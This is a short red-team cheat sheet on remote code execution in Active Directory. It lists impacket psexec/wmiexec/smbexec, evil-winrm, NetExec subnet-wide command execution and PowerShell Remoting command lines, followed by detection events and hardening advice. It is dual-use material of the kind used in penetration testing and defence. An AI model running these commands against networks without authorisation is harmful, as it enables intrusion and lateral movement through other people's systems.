---
title: "Remote execution (PsExec/WMI/WinRM)"
category: "red-team"
tags: ["lateral-movement", "execution"]
platform: "windows"
mitre: ["T1021"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# Remote code execution in AD

## TL;DR
Four main channels: SMB/PsExec (loud, creates a service), WMI (quieter), WinRM (native, port 5985), DCOM. The choice depends on available ports and OPSEC.

## Methods
```bash
# PsExec (SMB, creates a service + file – LOUDEST)
impacket-psexec corp.local/user:'Pass'@10.10.10.20

# WMI (no file on disk, port 135 – quieter)
impacket-wmiexec corp.local/user:'Pass'@10.10.10.20

# WinRM (native remoting, 5985/5986)
evil-winrm -i 10.10.10.20 -u user -p 'Pass'

# SMBexec (semi-interactive, via a service and bat files)
impacket-smbexec corp.local/user:'Pass'@10.10.10.20

# NetExec – run a command at scale
nxc winrm 10.10.10.0/24 -u user -p 'Pass' -x "ipconfig"
```
```powershell
# Native PowerShell Remoting
Invoke-Command -ComputerName srv01 -ScriptBlock { whoami } -Credential $cred
Enter-PSSession -ComputerName srv01 -Credential $cred
```

## Detection (Blue Team)
```text
PsExec  -> Event 7045 (new PSEXESVC service), 5145 (ADMIN$ share), file in C:\Windows
WMI     -> Event 4688 wmiprvse.exe -> child process; WMI-Activity 5857/5860
WinRM   -> Event 4624 logon, wsmprovhost.exe as parent
```

## Mitigation / Hardening
- Restrict remote admin logons (tiering, "Deny logon" GPO).
- Enable WMI/WinRM logging, alert on PSEXESVC.
- Host firewall: restrict 135/445/5985 to management.

## Sources
- [Impacket](https://github.com/fortra/impacket) · [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
